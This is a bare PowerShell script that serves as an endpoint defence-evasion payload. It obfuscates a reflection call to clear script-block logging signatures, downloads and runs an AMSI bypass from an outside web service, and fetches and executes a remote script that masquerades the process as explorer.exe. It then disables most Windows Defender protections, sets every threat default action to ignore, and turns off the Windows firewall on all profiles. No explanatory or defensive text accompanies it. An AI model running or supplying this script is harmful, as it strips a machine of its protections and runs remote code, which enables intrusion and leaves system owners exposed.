[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
Invoke-Expression $accessAMBY.Content
Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
MPEB -BinPath "C:\Windows\explorer.exe"
MPEB -BinPath "C:\Windows\explorer.exe"
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
